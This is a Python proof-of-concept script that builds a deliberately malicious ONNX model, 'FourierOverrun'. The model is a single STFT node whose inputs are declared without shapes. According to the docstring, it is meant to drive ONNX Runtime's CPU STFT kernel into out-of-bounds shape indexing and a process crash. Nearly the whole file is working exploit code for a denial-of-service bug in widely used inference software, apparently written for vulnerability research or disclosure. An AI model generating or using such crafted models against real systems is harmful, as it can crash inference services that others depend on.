#!/usr/bin/env python3
"""Build the malicious FourierOverrun ONNX model.

A single standard-domain STFT node (opset 17) whose graph inputs declare element
types but NO shapes. Without declared shapes, ONNX Runtime's schema shape
inference cannot reject rank-mismatched runtime tensors, so the CPU kernel's
unvalidated TensorShape indexing (dft.cc:645-646 in STFT::Compute, and
dft.cc:552-553 in short_time_fourier_transform) is reached and reads
signal_shape[0]/signal_shape[1] out of bounds -> std::terminate().

Inputs (STFT): signal (T1=float), frame_step (T2=int64), window (T1, optional),
frame_length (T2, optional). All declared with shape=None so rank is unvalidated.
"""
import os

import onnx
from onnx import TensorProto, helper

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "fourieroverrun.onnx")


def build(path):
    node = helper.make_node(
        "STFT", ["signal", "frame_step", "window", "frame_length"], ["output"],
        domain="", onesided=1,
    )
    graph = helper.make_graph(
        [node],
        "fourieroverrun",
        # shape=None -> ValueInfo carries type only, no shape (the reachability key)
        [
            helper.make_tensor_value_info("signal", TensorProto.FLOAT, None),
            helper.make_tensor_value_info("frame_step", TensorProto.INT64, None),
            helper.make_tensor_value_info("window", TensorProto.FLOAT, None),
            helper.make_tensor_value_info("frame_length", TensorProto.INT64, None),
        ],
        [helper.make_tensor_value_info("output", TensorProto.FLOAT, None)],
    )
    model = helper.make_model(
        graph,
        opset_imports=[helper.make_opsetid("", 17)],
        ir_version=8,
    )
    onnx.save(model, path)
    print(f"[+] wrote {path}")


if __name__ == "__main__":
    build(OUT)
